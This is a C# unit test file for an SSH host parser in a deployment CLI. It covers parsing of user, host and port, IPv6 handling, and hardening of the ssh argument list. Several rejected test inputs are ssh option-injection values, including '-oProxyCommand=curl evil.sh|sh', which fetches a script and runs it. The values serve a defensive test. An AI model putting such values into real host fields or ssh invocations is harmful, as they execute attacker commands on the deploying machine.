namespace Rask.Cli.Tests;

/// <summary>
/// <see cref="SshTarget"/> splits a <c>--host</c> value so the same box can be addressed both as
/// <c>docker -H ssh://user@box:2222</c> (port inline) and as <c>ssh -p 2222 user@box</c> (port as a
/// flag). Getting the port wrong is a lockout risk — the firewall opens the port we believe SSH is on.
/// </summary>
public class SshTargetTests
{
    [Theory]
    [InlineData("box", null, "box", null)]
    [InlineData("user@box", "user", "box", null)]
    [InlineData("deploy@box.example.com", "deploy", "box.example.com", null)]
    [InlineData("user@box:2222", "user", "box", 2222)]
    [InlineData("box:2222", null, "box", 2222)]
    [InlineData("root@10.0.0.5", "root", "10.0.0.5", null)]
    [InlineData("root@10.0.0.5:22", "root", "10.0.0.5", 22)]
    [InlineData("  user@box  ", "user", "box", null)] // surrounding whitespace is the user's, not the host's
    [InlineData("ssh://user@box", "user", "box", null)] // the URL form docker itself uses round-trips
    [InlineData("ssh://user@box:2222", "user", "box", 2222)]
    public void Parses_the_common_forms(string value, string? user, string host, int? port)
    {
        var target = SshTarget.Parse(value);

        Assert.Equal(user, target.User);
        Assert.Equal(host, target.Host);
        Assert.Equal(port, target.Port);
    }

    [Fact]
    public void A_bare_alias_keeps_its_name_and_gets_no_user()
    {
        // An ~/.ssh/config alias carries its own User/Port/HostName — we must not invent any.
        var target = SshTarget.Parse("prod-box");

        Assert.Null(target.User);
        Assert.Equal("prod-box", target.Host);
        Assert.Null(target.Port);
        Assert.Equal("prod-box", target.Destination);
    }

    [Theory]
    [InlineData("::1")]
    [InlineData("fe80::1")]
    [InlineData("user@fe80::1")]
    public void An_unbracketed_ipv6_literal_is_an_address_not_a_port(string value)
    {
        // "::1" ends in ":1" — splitting a port off it would silently address the wrong box.
        var target = SshTarget.Parse(value);

        Assert.Null(target.Port);
        Assert.EndsWith("::1", target.Host, StringComparison.Ordinal);
    }

    [Fact]
    public void A_bracketed_ipv6_literal_keeps_its_brackets_and_splits_its_port()
    {
        var target = SshTarget.Parse("user@[::1]:2222");

        Assert.Equal("user", target.User);
        Assert.Equal("[::1]", target.Host);
        Assert.Equal(2222, target.Port);
    }

    [Fact]
    public void A_bracketed_ipv6_literal_without_a_port_keeps_none()
    {
        var target = SshTarget.Parse("[::1]");

        Assert.Equal("[::1]", target.Host);
        Assert.Null(target.Port);
    }

    [Theory]
    [InlineData("box:notaport")]
    [InlineData("box:0")]
    [InlineData("box:70000")]
    [InlineData("box:-1")]
    public void A_trailing_colon_that_isnt_a_valid_port_stays_part_of_the_host(string value)
    {
        // Better to hand ssh a host it rejects loudly than to silently connect somewhere else.
        Assert.Null(SshTarget.Parse(value).Port);
    }

    [Theory]
    [InlineData("box")]
    [InlineData("user@box")]
    [InlineData("user@box:2222")]
    [InlineData("user@[::1]:2222")]
    public void ToString_round_trips_the_stored_form(string value) =>
        Assert.Equal(value, SshTarget.Parse(value).ToString());

    [Fact]
    public void WithUser_swaps_the_login_and_keeps_the_box()
    {
        // This is the root@box → deploy@box switch after the deploy user is created.
        var target = SshTarget.Parse("root@box:2222").WithUser("deploy");

        Assert.Equal("deploy@box:2222", target.ToString());
        Assert.Equal(2222, target.Port);
    }

    [Fact]
    public void Connection_arguments_are_non_interactive_and_end_with_the_destination()
    {
        var args = SshTarget.Parse("user@box").ConnectionArguments();

        // BatchMode makes a password-only box fail fast rather than hang on a prompt nobody can answer.
        Assert.Equal(["-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "--", "user@box"], args);
    }

    [Fact]
    public void Connection_arguments_pass_a_non_default_port_as_a_flag()
    {
        // ssh takes -p; only docker -H ssh:// accepts the port inline.
        var args = SshTarget.Parse("user@box:2222").ConnectionArguments();

        Assert.Equal(["-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-p", "2222", "--", "user@box"], args);
    }

    [Fact]
    public void A_fresh_connection_disables_control_path_multiplexing()
    {
        // Verification after a risky change MUST open a new channel — a reused ControlMaster session
        // would succeed on the old credentials and prove nothing.
        var args = SshTarget.Parse("user@box").ConnectionArguments(freshConnection: true);

        Assert.Equal(["-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-o", "ControlPath=none", "--", "user@box"], args);
    }

    // ── The destination is a security boundary ──────────────────────────────────────────────────────

    [Theory]
    [InlineData("-oProxyCommand=curl evil.sh|sh")]
    [InlineData("-oProxyCommand=touch /tmp/pwned")]
    [InlineData("-F/tmp/evil-config")]
    [InlineData("-obad@box")]
    [InlineData("ssh://-oProxyCommand=id")]
    [InlineData("-o@box")]              // a leading-dash *user* is just as dangerous
    public void A_host_that_would_be_read_as_an_ssh_option_is_rejected(string value)
    {
        // ssh cannot tell a destination from an option: "-oProxyCommand=…" as a host executes that
        // command on THIS machine. The host is remembered in the committed .rask/deploy.json and read
        // by CI, so a hostile value there must never reach the ssh binary.
        Assert.False(SshTarget.TryParse(value, out _, out var error));
        Assert.Contains("isn't a valid SSH host", error!, StringComparison.Ordinal);
        Assert.Throws<ArgumentException>(() => SshTarget.Parse(value));
    }

    [Theory]
    [InlineData("box with space")]
    [InlineData("user name@box")]
    [InlineData("box\nother")]
    [InlineData("box\ttab")]
    [InlineData("")]
    [InlineData("   ")]
    public void A_host_with_whitespace_or_control_characters_is_rejected(string value) =>
        Assert.False(SshTarget.TryParse(value, out _, out _));

    [Fact]
    public void The_destination_is_guarded_with_a_double_dash_even_so()
    {
        // Defence in depth: `--` stops ssh reading the destination as an option regardless of how the
        // value got here. Verified against the real ssh binary — it reports "hostname contains invalid
        // characters" instead of honouring -oProxyCommand.
        var args = SshTarget.Parse("user@box").ConnectionArguments();

        var dashDash = args.ToList().IndexOf("--");
        Assert.True(dashDash >= 0, "the destination must be guarded by --");
        Assert.Equal(args.Count - 1, dashDash + 1); // nothing but the destination after it
    }

    [Theory]
    [InlineData("box")]
    [InlineData("user@box")]
    [InlineData("prod-box")]        // an ssh-config alias
    [InlineData("user@box:2222")]
    [InlineData("root@10.0.0.5")]
    [InlineData("user@[::1]:2222")]
    public void Ordinary_hosts_still_parse(string value) => Assert.True(SshTarget.TryParse(value, out _, out _));
}
